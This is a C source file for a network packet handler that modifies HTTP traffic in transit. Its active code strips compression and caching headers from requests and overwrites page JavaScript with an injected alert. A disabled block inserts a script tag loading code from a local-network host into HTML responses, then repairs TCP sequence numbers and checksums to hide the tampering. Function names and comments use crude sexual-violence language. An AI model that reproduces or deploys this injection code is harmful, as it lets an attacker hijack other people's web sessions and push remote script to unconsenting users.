#include "http.h"

#include <string.h>
#include <stdlib.h>

#include "common.h"
#include "router.h"
#include "packet_info.h"
#include "gzip_wrapper.h"
#include "tcp_stream.h"



int one_shot_init(void *pi);

void    *tss    = 0;

int (*http_handle_fun)(void*) = one_shot_init;

#if 0

unsigned int
already_fucked_this_baby(void *pi)
{
#if 0
    if(0 == tss_search(tss, pi))
        return false;

    80 == _ntoh16(get_tcp_hdr(pi)->source) ?
        _MESSAGE_OUT("s ---> c ") : _MESSAGE_OUT("c ===> s ");

    _MESSAGE_OUT("seq : 0x%08x    ack_seq : 0x%08x    "
                 "pkt_size : %-4u    tcp_data_len : %-4u\n",
                    _ntoh32(get_tcp_hdr(pi)->seq),
                    _ntoh32(get_tcp_hdr(pi)->ack_seq),
                    get_pkt_len(pi),
                    get_tcp_data_len(pi));
#endif
    unsigned int    data_size   = tss_s2c_data_size(tss, pi);
    unsigned int    start_seq   = 0;
    unsigned int    seq_tmp     = 0;
    unsigned short  port80      = _ntoh16(80);
    struct _tcphdr  *tcp        = get_tcp_hdr(pi);

    if(0 == data_size || 0 == tcp) return false;

    start_seq   = tss_s2c_insert_start_seq(tss, pi);

    // seq and ack_seq fix
    // s2c 
    if(port80 == tcp->source)
    {
        seq_tmp     = _ntoh32(tcp->seq);
        // no need , out of order
        // todo : when seq overflow, it will crash
        if(seq_tmp < start_seq) return false;

        seq_tmp     += data_size;
        tcp->seq    = _ntoh32(seq_tmp);
    }
    // c2s 
    else if(port80 == tcp->dest)
    {
        seq_tmp         = _ntoh32(tcp->ack_seq);

        // no need , out of order
        // todo : when seq overflow, it will crash, same as above
        if(seq_tmp < start_seq) return false;

        seq_tmp         -= data_size;
        tcp->ack_seq    = _ntoh32(seq_tmp);
    }
    else
    {
        return false;
    }
    _MESSAGE_OUT("im in\n");

    tcp_checksum(pi);

    return true;
}


unsigned int
i_can_fuck_this_beauty(void *pi)
{
    unsigned char   *http   = get_http_ptr(pi);
    unsigned int    hdr_len = get_http_hdr_len(pi);

    if(0 == http || 0 == hdr_len) return false;

    if('H' == *http
        && strnstr(http, "Transfer-Encoding: chunked", hdr_len)
        && strnstr(http, "Content-Type: text/html", hdr_len)
        && !strnstr(http, "Content-Encoding: gzip", hdr_len))
    {
        _MESSAGE_OUT("====================yes!!!!\n");
        return true;
    }

    return false;
}


// split her legs and shoot something into her body
unsigned int
open_beautiful_legs_and_do_fuck(void *pi)
{
    // static int i=0;
    // if(i) return false;
    // i=1;
    if(get_pkt_len(pi) > 1400) return false;

    unsigned char   *http   = get_http_ptr(pi);
    unsigned int    hdr_len = get_http_hdr_len(pi);
    unsigned int    hdata_len   = get_tcp_data_len(pi) - get_http_hdr_len(pi);
    unsigned char   buf[1800]   = {0};

    if(0 == http || 0 == hdr_len) return false;


    unsigned char   gzipbuf[1800]   = {0};
    unsigned int    gzsize          = 1800;
    unsigned char   *js             = 
#if 1
    "<script src=\"http://192.168.1.111/fuck.js\"></script>";
#else
    "\x3c\x73\x63\x72\x69\x70\x74\x3e\x61\x6c\x65\x72\x74\x28\x22\xb2\xdd\xc4\xe2\xd7\xe6\xd7\xda\x22\x29\x3b\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e\x0a";
#endif
    unsigned int    c_size          = 0;
    gzsize = strlen(js);
    memcpy(gzipbuf, js, c_size);
    // if(0 != gzcompress(js, strlen(js), gzipbuf, &gzsize))
    //     return false;

    sprintf(buf, "%x\r\n", gzsize);
    c_size  = strlen(buf);
    _MESSAGE_OUT("chunked size : %x\n", gzsize);
    memcpy(buf + c_size, gzipbuf, gzsize);
    c_size  += gzsize;
    memcpy(buf + c_size, "\r\n", 2);
    c_size  += 2;

    memcpy(buf + c_size, http + get_http_hdr_len(pi), hdata_len);
    memcpy(http + get_http_hdr_len(pi), buf, hdata_len + c_size);

    pi_set_pkt_len(pi, get_pkt_len(pi) + c_size);
    unsigned short totlen  =   _ntoh16(get_ip_hdr(pi)->tot_len);
    totlen += c_size;
    get_ip_hdr(pi)->tot_len = _ntoh16(totlen);

 

    tss_insert(tss, pi);
    tss_add_s2c_data_size(tss, pi, c_size);

    tcp_checksum(pi);
    ip_checksum(pi);

    _MESSAGE_OUT("target : %s - %u  ", _netint32toip(get_ip_hdr(pi)->saddr), _ntoh16(get_tcp_hdr(pi)->dest));
    _MESSAGE_OUT("====%x\n", c_size);




    return false;
}

#endif


unsigned int
i_wanna_fuck_this_beauty(void *pi)
{
    unsigned char   *http   = get_http_ptr(pi);
    unsigned int    hdr_len = get_http_hdr_len(pi);

    if(0 == http || 0 == hdr_len) return false;

    if('G' == *http)
    {
        // unsigned char out[1800] = {0};
        // unsigned char *p    =  (unsigned char*)strnstr(http, "\r\n", hdr_len);
        // if(0 == p) return false;
        // memcpy(out, http, p - http);
        // _MESSAGE_OUT("%s\n", out);
        unsigned char out[1800] = {0};
        unsigned char *p        = strnstr(http, "Accept-Encoding:", hdr_len);
        unsigned char *pend     = 0;
        unsigned char *pevil    = "Accept-Encoding: none";


        if(!p) return false;
        pend    = strnstr(p, "\r\n", hdr_len);
        memset(p, ' ', pend-p);
        memcpy(p, pevil, strlen(pevil));
        static unsigned int i = 0;


        p   = strnstr(http, "If-Modified-Since:", hdr_len);
        if(p)
        {
            pend    = strnstr(p, "\r\n", hdr_len);
            memset(p, ' ', pend-p);
        }



        tcp_checksum(pi);
        // _MESSAGE_OUT("evil!  No.%d\n", i++);
        // if(strnstr(http, "GET / HTTP/1.1", hdr_len))
        // {
        //     memcpy(out, http, hdr_len);
        //     _MESSAGE_OUT("%s\n", out);
        // }
    }



    return false;
}


unsigned int
fuck_test(void *pi)
{
    unsigned char   *http   = get_http_ptr(pi);
    unsigned int    td_len  = get_tcp_data_len(pi);

    if(0 == http || 0 == td_len) return false;

    unsigned char   *p  = 0;
    unsigned char   *e  = ">alert(\"该充钱了\");  ";
    p = strnstr(http,     "type=\"text/javascript\">" ,td_len);
    if(p)
    {
        memcpy(p, e, strlen(e));
    }
    tcp_checksum(pi);
    return false;

}



int
http_handler(void *pi)
{
    i_wanna_fuck_this_beauty(pi);
    fuck_test(pi);
    return PKT_ACCEPT;
#if 0
    if(already_fucked_this_baby(pi)) return PKT_ACCEPT;

    return (i_can_fuck_this_beauty(pi) && open_beautiful_legs_and_do_fuck(pi)) ?
            PKT_STOLEN : PKT_ACCEPT;
#endif
}


int
one_shot_init(void *pi)
{
    http_handle_fun = http_handler;

    // _MESSAGE_OUT("===========================one shot init!!!!!\n");
    while(!tss) tss = tss_create();

    return (*http_handle_fun)(pi);
}


int
http(void *pi)
{
    return (*http_handle_fun)(pi);
}

